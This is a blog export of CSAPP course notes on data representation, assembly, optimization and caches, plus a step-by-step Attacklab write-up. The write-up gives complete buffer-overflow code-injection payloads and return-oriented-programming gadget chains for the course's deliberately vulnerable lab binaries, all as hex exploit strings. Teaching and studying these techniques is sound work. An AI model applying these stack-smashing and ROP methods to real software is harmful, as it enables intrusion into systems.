101.11~2~ 2 + 7/8 = 10.111~2~ 1/3 = 0.0101[01]…~2~ ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:4:1","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"IEEE Floating Point f = (-1)^s^ M 2^E^ E = exp - Bias eg. exp has 8 bits, Normally 1\u003c=exp\u003c=254, bias = 127, so -126\u003c=E\u003c=127 why introducing the bias? for better comparison M = 1.0 + frac = 1.xxxx..x~2~ eg. minimum: xxxx..x = 0000..0, M = 1.0 eh. maximum: xxxx..x = 1111..1, M -\u003e 2.0 Take 15123 as an example: 15213 = 11101101101101~2~ = 1.1101101101101~2~ * 2^13^ M = 1.1101101101101~2~, frac = 1101101101101 + 0000000000 E = 13, bias = 127 -\u003e exp = 140 = 10001100~2~ so result: 0 10001100 1101101101101 0000000000 totally 32 bits For Denormalized Number: when exp = 00000..0 E = 1 - bias, M = frac (no leading 1) cases: frac = 0000.0: representing 0 (including -0 and +0) frac != 0000.0: closest to 0 For Denormalized Number: when exp = 1111..1 E = 1 - bias, M = frac (no leading 1) why for this? to represent more numbers, see the figure below cases: frac = 0000.0: representing inf frac != 0000.0: representing nan Examples together Note: when closing to 0, the numbers get denser ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:4:2","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Rounding, addition and multiplication Round strategy Towards 0 Round down(-inf) Round up(+inf) Nearest Even(default) eg: round to nearest 1/4 2 + 3/16 = 10.00110~2~ = 10.01~2~ (\u003e1/2 - UP) 2 + 7/8 = 10.11100~2~ = 11.00~2~ (exactly half) 2 + 5/8 = 10.10100~2~ = 10.10~2~ (exactly half) multiplication (-1)^s1^ M1 2^E1^ * (-1)^s2^ M2 2^E2^ s = s1 ^ s2 M = M1 * M2 E = E1 + E2 if after calculation, M \u003e 2 -\u003e shift M right, increment E If E out of range, overflow Round M to fit frac So now you understand why (1e20*1e20)*1e-20 = inf； (1e20*(1e-20*1e20) = 1e20 a\u003e=b \u0026 c\u003e=0 so a*c \u003e= b*c? Almost, Always consider inf and nan addition core: get binary points lined up (-1)^s1^ M1 2^E1^ + (-1)^s2^ M2 2^E2^ if after calculation, M \u003e 2 -\u003e shift M right, increment E M \u003c 1 -\u003e shift M left, decrement E If E out of range, overflow Round M to fit frac So now you understand why (1e20+-1e20)+3.14 = 3.14； (1e20+(-1e20+3.14) = ?? ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:4:3","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Floating point to C int -\u003e float: round 32 bits value to 23 bits frac double -\u003e int: round 52 bits frac to 32 bits 2/3 != 2/3.0 (floating point) double d \u003c 0 -\u003e d*2 \u003c0 (YES! even if overflow, it’s negative inf) ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:4:4","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"4. Machine Level Programing ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:5:0","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"C, assembly, machine code The process of compiling C: Compiler: GCC, to make assembly code: gcc -Og -S ... to make exec file(actually bytes of instructions) into assembly code: objdump -d ... ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:5:1","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Assembly Basics: Registers, operands, move Some specific registers: %rsp: stack pointer %rdi: first argument of function %rsi: second argument of function %rdx: third argument of function the relationships between different names of a register: |63..32|31..16|15-8|7-0| | AH |AL | | AX.....| |EAX............| |RAX...................| Memory access of moveq: Normally: (%rax) = Mem[rax] With offset: 8(%rax) = Mem[rax + 8] Generally: D(Rb, Ri, S) = Mem[Rb + S * Ri + D] ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:5:2","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Arithmetic \u0026 logical operations For example: leaq leaq 4(%rsi, %rsi, 2), %rdx: rdx = rsi + 2 * rsi + 4 ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:5:3","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Control: Condition codes %rip: instruction pointer Condition Codes CF(carry flag)–for unsigned overflow ZF(zero flag) SF(sign flag)–for signed OF(overflow flag)– for signed overflow cmpq: compare number (b-a) and set condition codes above testq: compare number (a\u0026b) but only set ZF and SF setX: set the low-order byte of destination to 0 or 1 based on the condition codes above example int gt (long x, long y) {return x\u003ey;} # compare x, y (%rsi is y, %rdi is x) cmpq %rsi, %rdi # Set when \u003e (if x-y \u003e 0, SF=1 and OF=1 or SF=0, OF=0) setg %al # move bytes to long, zero padding # Note this is %eax rather than %rax # this is because 32-bit instructions also set upper 32 bits to 0. movzbl %al, %eax ret ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:5:4","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Conditional branches jX: jump to different part of code depending on condition codes Note: Sometimes like Test? x+y:x-y in C, it’s efficient to calculate x+y and x-y both, then choose one using conditional move rather than using branches. Since branches are very disruptive to instruction flow through pipelines conditional move eg: cmovle %rdx %rax: if \u003c=, result = %rdx only use this when calculation is simple and is safe! ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:5:5","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Loops Using branches and control introduced above to realize do-while, while and for. ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:5:6","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Switch Statements Structure: How to form a jump table? Normally to make an array, and for some holes like x=0, x=4, let it go to the default part. Note: if x has a extremely large case like 10086, it can add a bias then make an array flow(like mapping to 7), too. Or sometimes it can be optimized to a decision tree–simple if else structure(in cases it’s hard to make an array flow) How to jump through table? # x compare 6 cmpq $6, %rdi # Use default: since we use **ja**(unsigned) here # jump if x \u003e 6 or x \u003c 0(unsigned negative is a large positive) ja .L8 # refer to (L4 + 8 * %rdi) address, get the value of it and then jump jmp *.L4(, %rdi, 8) ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:5:7","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Stack Structure ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:5:8","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Calling Conventions passing control: when calling a function, push the next instruction address to the stack, when ret, get the address back then jump to the address. passing data: save local data: Normally, use %rsp directly, sub some value at the beginning, then add it back before return. It’s OK to use movl to %esi, since the rest of 32 bits would be set to zero. This depends on the compiler Sometimes use %rbp, like allocating an array or memory buffer Caller Saved and Callee Saved Rules we need to obey, set in ABI(application binary interface) caller saved: the register can be overwritten–%rax, all of the arguments from %rdi to %r9, tmp %r10 and %r11 callee saved: the callee make sure not to affect any data used in the caller–%rbx, from %r12 to %r14, %rbp and %rsp recursive function example: ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:5:9","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Arrays ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:5:10","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Structures ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:5:11","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Floating Point float add(param passed in %xmm0, %xmm1): double add: ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:5:12","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Memory Layout stack for local variable (if more than 8MB, segmentation fault) heap memory is dynamically allocated for malloc、new … data is for static data Text/Shared Libraries for executable instructions(read only) ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:5:13","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Buffer Overflow If you input 23 characters in gets(), it’s ok (a default \\0 at the end of line) If you put 24 characters or more, it will gets to the return address and may cause a segmentation fault(depends on the address you jump to) code injection attacks Covering the return address, and use the instruction we input (see attacklab for more details) Ways to avoid: avoid overflow Vulnerabilities in Code: fgets instead of gets strncpy instead of strcpy don’t use scanf with %s system-level protections random stack offset: hard to predict the beginning of code non-executable code segments: only execute the read-only memory instructions stack Canaries save Canary in %rsp at first and then recheck it in the end(see bomblab for more details) Return-Oriented Programming attacks Use existing codes(gadgets) to attack, see attacklab for more details. ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:5:14","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"5. Program Optimization ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:6:0","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Generally Useful Optimizations Code motion/pre-computation strength reduction Core: replace costly operation with simpler one (eg. 16 * x -\u003e x «4) sharing of common sub-expressions eg: f = func(param), then use f directly, instead of a = func(param) + 2, b = func(param)*3 ... removing unnecessary procedure calls Why compiler doesn’t optimize this? Remember compiler always considers the procedure as black box. (It doesn’t know whether the procedure will change the pointer or global variable, etc.) Note: in python, len(str) is a O(1) func, so it doesn’t really matter. Remove memory accessing As you can see the b[i] has to read from memory each time It’s better using a local variable to cal the sum Why compiler can’t optimize it? Memory Aliasing ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:6:1","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Exploiting instruction-level parallelism CPE (cycles per element (OP like add) ) modern cpu design ideas of pipeline (p1 = a*b, dependency) Loop Unrolling For making use of multi-core processor for (i = 0; i \u003c limit; i += 2){ // x = x + array[i] + array[i+1]; x = x + (array[i] + array[i+1]); // can break the sequential dependency // another idea // x0 = x0 + array[i]; // x1 = x1 + array[i+1]; } Note: Not always useful, based on the processor SIMD operations Based on wide registers: Also called AVX instructions ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:6:2","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Dealing with Conditionals In order to making instructions run smoothly. We introduce the branch predict Simply guess the branch to go Begin executing instructions at predicted position It can recover when mis-prediction, causing huge performance cost ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:6:3","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"C Review Be careful when unsigned u \u003e -1: -1 is the biggest when unsigned Initialize array with exact value Remember there is a \\0 at the end of string When sizeof(xx), make sure xx is not a pointer Remember to free after malloc Don’t return a pointer pointing at a local variable int *a; when a + 1, address of a actually add sizeof(int) * 1 = 4 ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:6:4","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"6. Memory ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:7:0","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Storage technologies and trends Random-Access Memory(RAM) SRAM(static, expensive, cache, volatile: lose information when power off) DRAM(dynamic, main memory, volatile) Read-only memory(ROM) nonvolatile: keep information when power off BIOS, firmware programs saved in ROM Bus(collection of parallel wires) structure Disk capacity: 512 bytes/sector * 300 sectors/track(on average) * 20000 tracks/surface * 2 surfaces/platter * 5 platters/ disk = 30.72GB disk access: Normally disk access time = seek time(4~9ms) + rotation(2~5ms) + transfer(0.02ms), much slower than RAM(ns) Bus structure expand Note: this is not the modern design, which use point to point connection instead of a public wire interrupt: cpu never waits for disk, when data is carried from disk to memory, it will notify cpu and let cpu continue to work on that data. solid state disk(ssd): much faster than normal disk cpu-memory-gap ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:7:1","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Locality of reference principle programs tend to use data and instructions with addresses near or equal to those they have used recently ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:7:2","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Caching in memory hierarchy ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:7:3","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Cache memory organization and operation general cache organization cache_size = S * E * B bytes cache read locate set check all lines in set to match tag tag matches and valid is true: hit locate data by offset Note: if not match, old line is evicted and replaced simple example When there comes a 8 [1000], it will miss, and set 0 is evicted And when there comes a 0 [0000], it will miss again However, if we change the bits of lines, it will change. block size: hyperparameter of memory system if too small: locality principle(easily use nearby bytes) is not used if too large: long time to evict memory to be continued … Confused about some of the content? Feel free to report an issue here. ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:7:4","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":null,"content":"Hello friend, welcome to my blog! My name is yewentao, working in sensetime (Shanghai) as a deep learning system development engineer. My email: zhyanwentao@outlook.com Note: If you can’t see pictures in my blog, please use vpn. ","date":"2023-02-03","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"},{"categories":["csapp"],"content":"Summary Attacklab from CSAPP 15213, including P1-Code Injection Attacks and P2-Return-Oriented Programming. It’s a little bit hard, please be patient and gradually find your way out, best wishes! Source: [https://github.com/yewentao256/CSAPP_15213/tree/main/attacklab] ","date":"2023-02-03","objectID":"/posts/csapp/attacklab/:1:0","tags":null,"title":"Attacklab","uri":"/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"Set up Environment Using a docker container is the simplest way, source from yansongsongsong docker run --privileged -d -p 1221:22 --name bomb yansongsongsong/csapp:attacklab Then using vscode remote ssh to connect with it as we described in datalab password: THEPASSWORDYOUCREATED ","date":"2023-02-03","objectID":"/posts/csapp/attacklab/:2:0","tags":null,"title":"Attacklab","uri":"/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"Part1: Code Injection Attacks ","date":"2023-02-03","objectID":"/posts/csapp/attacklab/:3:0","tags":null,"title":"Attacklab","uri":"/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"phase_1 This phase requires us to call touch1() at the end of test() in ctarget void test() { int val; val = getbuf(); // here is a dangerous getbuf call that we can make use of printf(\"No exploit. Getbuf returned 0x%x\\n\", val); } void touch1() { vlevel = 1; /* Part of validation protocol */ printf(\"Touch1!: You called touch1()\\n\"); validate(1); exit(0); } Firstly let’s see assembly code: objdump -d ctarget \u003e ctarget.asm 00401968 \u003ctest\u003e: 401968: 48 83 ec 08 sub $0x8,%rsp 40196c: b8 00 00 00 00 mov $0x0,%eax 401971: e8 32 fe ff ff callq 4017a8 \u003cgetbuf\u003e 401976: 89 c2 mov %eax,%edx 401978: be 88 31 40 00 mov $0x403188,%esi 40197d: bf 01 00 00 00 mov $0x1,%edi 401982: b8 00 00 00 00 mov $0x0,%eax 401987: e8 64 f4 ff ff callq 400df0 \u003c__printf_chk@plt\u003e 40198c: 48 83 c4 08 add $0x8,%rsp We notice that there is a call for getbuf(), and the address of touch1 is 004017c0 \u003ctouch1\u003e. 004017a8 \u003cgetbuf\u003e: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 \u003cGets\u003e 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq Here function Gets put the value we input in %rsp, see disas Gets for more details if you are interested. Here is the stack: | return address | | 0x28 | | 0x20 | | 0x18 | | 0x10 | | 0x08 | | 0x00 | So we should put more things than 0x28, the additional 0x004017c0covering the return address Then we get the answer: (little-endian) 00 00 00 00 00 00 00 00 // 64 bit, 8 bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 // 0x28 bytes c0 17 40 00 // use `touch1` to cover the return address Save it in phase_1_raw.txt(remove the comments) then ./hex2raw \u003cphase_1_raw.txt \u003ephase_1.txt then ./ctarget -qi phase_1.txt to pass the phase_1 ","date":"2023-02-03","objectID":"/posts/csapp/attacklab/:3:1","tags":null,"title":"Attacklab","uri":"/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"phase_2 This phase we need to call touch2, and the cookie should equal to the value void touch2(unsigned val) { vlevel = 2; /* Part of validation protocol */ if (val == cookie) { printf(\"Touch2!: You called touch2(0x%.8x)\\n\", val); validate(2); } else { printf(\"Misfire: You called touch2(0x%.8x)\\n\", val); fail(2); } exit(0); } Dump of assembler code for function touch2: 0x004017ec \u003c+0\u003e: sub $0x8,%rsp // .... It is clear that we should not only change the return address, but also change the value of val(%rdi), to match the cookie(0x59b997fa) How could we change the value of %rdi? we can inject movq $0x59b997fa %rdi instruction to the buffer. Here are all of the instructions we need: movq $0x59b997fa, %rdi // move cookie to rdi pushq $0x4017ec // push the touch2 address to the stack ret // pop the stack and jump to the address Saved it in phase_2_inject.s then gcc -c phase_2_inject.s Finally objdump -d phase_2_inject.o we get the codes 0: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7: 68 ec 17 40 00 pushq $0x4017ec c: c3 retq We also need to make sure the codes above can be executed. How could we do that? Considering the stack: | return address | // return address of after calling `get_buf` | 0x28 | | 0x20 | | 0x18 | | 0x10 | | 0x08 | | 0x00 | // %rsp We can put our codes to %rsp and then make the return address pointing to that %rsp, like this: | return: %rsp | // return address of after calling `get_buf` | .... | | .... | | .... | | ret | | pushq | | move | // %rsp How to get the address of %rsp? Using gdb, stepi to 4017a8: 48 83 ec 28 sub $0x28,%rsp, then p $rsp and we get 0x5561dc78 Now we can make the answer: 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 Note: if you use gdb to see %rsp after calling getbuf, you’ll see 0x5561dc78: 0x48 0xc7 0xc7 0xfa 0x97 0xb9 0x59 0x68 0x5561dc80: 0xec 0x17 0x40 0x00 0xc3 0x00 0x00 0x00 0x5561dc88: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x5561dc90: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x5561dc98: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x5561dca0: 0x78 0xdc 0x61 0x55 0x00 0x00 0x00 0x00 ","date":"2023-02-03","objectID":"/posts/csapp/attacklab/:3:2","tags":null,"title":"Attacklab","uri":"/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"phase_3 This phase needs us to call touch3, and pass the validation int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; // \"%.8x\" means put the unsigned hex string of cookie to s sprintf(s, \"%.8x\", val); // When using strncmp, actually compare about the ascii // ascii string of cookie(ascii): 35 39 62 39 39 37 66 61 return strncmp(sval, s, 9) == 0; } void touch3(char *sval) // address of touch3：0x4018fa { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\"Touch3!: You called touch3(\\\"%s\\\")\\n\", sval); validate(3); } else { printf(\"Misfire: You called touch3(\\\"%s\\\")\\n\", sval); fail(3); } exit(0); } Now that the address pointer s is unpredictable, we can’t directly change the value of it. But we can still change the value of *sval(%rdi). Note: This time it is a pointer (simply a value in phase_2), we must pass an address to it and then store our hex cookie in that address. we may consider injecting codes like: movq $address, %rdi // the address of our cookie pushq $0x4018fa // address of touch3 ret // return to touch3 But what address should we use? If we put it in the buffer, like: | return: %rsp | // return address of after calling `get_buf` | .... | | cookie | | .... | | ret | | pushq | | move | // %rsp: 0x5561dc78 We may not get the correct answer. See the codes of hexmatch and touch3: 000000000040184c \u003chexmatch\u003e: 40184c: 41 54 push %r12 40184e: 55 push %rbp 40184f: 53 push %rbx // ... 00000000004018fa \u003ctouch3\u003e: 4018fa: 53 push %rbx // ... As we can see here, the touch3 and hexmatch push data into stack and may cover the buffer we try to input. This is because after we call Gets() in getbuf(), the stack is like this: | return: %rsp | // return address of after calling `get_buf` | .... | | .... | | .... | | ret | | pushq | | move | // %rsp: 0x5561dc78 But in the end of getbuf, it will add 0x28 to %rsp and then pushq and make it 0x5561dca8, the stack is now like this: | .... | // %rsp: 0x5561dca8 | return: %rsp | | .... | // value here may be covered by push! | .... | // value here may be covered by push! | .... | // value here may be covered by push! | ret | | pushq | | move | // %rsp before: 0x5561dc78 So we have to find a new address to put our hex cookie value, considering using the frame of test(), it will not be affected by any pushq | frame: test | | .... | // address: 0x5561dca8 | return address | | .... | | frame: getbuf | | .... | we can make it like this: | frame: test | | cookie value | // address: 0x5561dca8, in frame of test | return: %rsp | // execute our injected code in 0x5561dc78 | .... | | .... | | .... | | ret | | pushq | | move | // %rsp: 0x5561dc78 And now we can get the answer: movq $0x5561dca8, %rdi // the address of our cookie pushq $0x4018fa // address of touch3 ret // return to touch3 // generating the assembly codes 0: 48 c7 c7 a8 dc 61 55 mov $0x5561dca8,%rdi 7: 68 fa 18 40 00 pushq $0x4018fa c: c3 retq And make it to the final answer: 48 c7 c7 a8 dc 61 55 68 // address: 0x5561dc78, executing our code fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 // return to 0x5561dc78 35 39 62 39 39 37 66 61 // our hex cookie saved in $0x5561dca8 ","date":"2023-02-03","objectID":"/posts/csapp/attacklab/:3:3","tags":null,"title":"Attacklab","uri":"/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"Part2: Return-Oriented Programming In real environment, it’s hard to inject code because we have Stack Randomization and Stack Read-Only Access. So we have to use the current codes(gadget) to attack. For instance: void setval_210(unsigned *p) { *p = 3347663060U; } // compiling... 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi) 400f1b: c3 retq 48 89 c7 is movq %rax, %rdi and c3 is retq So if we starts from 400f18, it’s like we are executing movq %rax, %rdi retq ","date":"2023-02-03","objectID":"/posts/csapp/attacklab/:4:0","tags":null,"title":"Attacklab","uri":"/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"phase_4 This phase requires us to repeat the attack of phase_2, but using Rtarget. we can only use instructions of movq popq ret nop and the first eight x86-64 registers (%rax–%rdi). Recall the phase_2, we need to realize: move cookie to $rdi execute touch2 Firstly objdump -d rtarget \u003e rtarget.asm to see what gadgets we can make use of. If we can find gadgets like popq %rdi(5f), that could be quite easy, but we can’t find one in farm. So we decide to use 58（popq %rax), the instrcutions are: popq %rax // 58 ret // c3 moveq %rax, %rdi // 48 89 c7 ret // c3 The gadgets we use are: 00000000004019ca \u003cgetval_280\u003e: 4019ca: b8 29 58 90 c3 mov $0xc3905829,%eax 4019cf: c3 retq 00000000004019a0 \u003caddval_273\u003e: 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6: c3 retq The stack is like: | return: touch2 | |return: 0x4019a2| // execute 48 89 c7(moveq %rax, %rdi) then ret | cookie value | // after popq, the value here is stored in %rax |return: 0x4019cc| // execute 58 (popq %rax) then ret | .... | | .... | | .... | | .... | | .... | | .... | // %get buf start So we can get the answer: (Note: ret get 8 bytes of address) 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 cc 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00 ","date":"2023-02-03","objectID":"/posts/csapp/attacklab/:4:1","tags":null,"title":"Attacklab","uri":"/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"phase_5 This phase requires us to repeat the attack of phase_3, but using Rtarget. Including movq popq ret nop, we can now use movl and additional func nop(andb, orb, cmpb, testb). Note these func nop do not change the value in our registers. Recall the phase_3, we need to realize: save cookie in address x, move x to $rdi execute touch3 Note we can’t declare an address x directly like phase_2 because of stack randomization, how could we get the address of x? Although the address of %rsp is always changing, the offset is always the same. For example, we may put our string in address %rsp + 0x30, and pass the address (%rsp + 0x30) to %rdi. So we may want to find instructions like: popq %rax // and our offset saved in %rax lea (%rsp, %rax, 1), %rdi Unlucily, we don’t find an instruction for lea (%rsp, %rax, 1), %rdi, but we can find another one here: 00000000004019d6 \u003cadd_xy\u003e: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq So we can generate our instrucstions based on add_xy: // no `movq %rsp, %rdi; ret` found in farm, so use %rax as a temp movq %rsp, %rax ret // 48 89 e0 ... c3 0x401aad \u003csetval_350\u003e movq %rax, %rdi ret // 48 89 c7 ... c3 0x4019c5 \u003csetval_426\u003e popq %rax ret // pop offset to %rax, 58 ... c3 0x4019cc \u003cgetval_280\u003e // no `movq %rax, %rsi` or `movl %eax, %esi` found in farm // so we have to use `%edx`, `%ecx` as temp movl %eax, %edx ret // 89 c2 ... c3 0x4019dd \u003cgetval_481\u003e movl %edx, %ecx ret // 89 d1 ... c3 0x401a34 \u003cgetval_159\u003e (38 c9 is a nop) movl %ecx, %esi ret // 89 ce ... c3 0x401a13 \u003caddval_436\u003e \u003cadd_xy\u003e // lea and ret, 0x4019d6 movq %rax,%rdi ret // 48 89 c7 ... c3 0x4019a2 \u003caddval_273\u003e The stack is like: | our hex cookie | // our hex cookie value here |return: 0x4018fa| // execute touch3 |return: 0x4019a2| // execute `movq %rax,%rdi ret` |return: 0x4019d6| // execute \u003cadd_xy\u003e |return: 0x401a13| // execute `movl %ecx, %esi ret` |return: 0x401a34| // execute `movl %edx, %ecx ret` |return: 0x4019dd| // execute `movl %eax, %edx ret` | offset: 0x?? | // our offset here |return: 0x4019cc| // execute `popq %rax ret` |return: 0x4019c5| // execute `movq %rax, %rdi ret` |return: 0x401aad| // execute `movq %rsp, %rax ret` // %getbuf + 0x30 | .... | | .... | | .... | | .... | | .... | | .... | // %get buf start But here comes another question: what’s the offset should be? Note: Dump of assembler code for function getbuf 0x00000000004017a8 \u003c+0\u003e: sub $0x28,%rsp 0x00000000004017ac \u003c+4\u003e: mov %rsp,%rdi 0x00000000004017af \u003c+7\u003e: callq 0x401b60 \u003cGets\u003e 0x00000000004017b4 \u003c+12\u003e: mov $0x1,%eax 0x00000000004017b9 \u003c+17\u003e: add $0x28,%rsp =\u003e 0x00000000004017bd \u003c+21\u003e: retq Recall that when retq, the %rsp adds 0x8, and get the address back. So when executing movq %rsp, %rax, the %rsp is now pointing at | our hex cookie | // %rsp + 0x50 |return: 0x4018fa| // execute touch3 |return: 0x4019a2| |return: 0x4019d6| |return: 0x401a13| |return: 0x401a34| |return: 0x4019dd| | offset: 0x?? | |return: 0x4019cc| |return: 0x4019c5| |return: 0x401aad| // execute `movq %rsp, %rax ret` // %rsp here | .... | | .... | So we know the offset is 0x50 And we can finally get our answer: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ad 1a 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 cc 19 40 00 00 00 00 00 50 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 34 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 Good luck! ","date":"2023-02-03","objectID":"/posts/csapp/attacklab/:4:2","tags":null,"title":"Attacklab","uri":"/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"Appendix: farm 0000000000401994 \u003cstart_farm\u003e: 401994: b8 01 00 00 00 mov $0x1,%eax 401999: c3 retq 000000000040199a \u003cgetval_142\u003e: 40199a: b8 fb 78 90 90 mov $0x909078fb,%eax 40199f: c3 retq 00000000004019a0 \u003caddval_273\u003e: 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6: c3 retq 00000000004019a7 \u003caddval_219\u003e: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq 00000000004019ae \u003csetval_237\u003e: 4019ae: c7 07 48 89 c7 c7 movl $0xc7c78948,(%rdi) 4019b4: c3 retq 00000000004019b5 \u003csetval_424\u003e: 4019b5: c7 07 54 c2 58 92 movl $0x9258c254,(%rdi) 4019bb: c3 retq 00000000004019bc \u003csetval_470\u003e: 4019bc: c7 07 63 48 8d c7 movl $0xc78d4863,(%rdi) 4019c2: c3 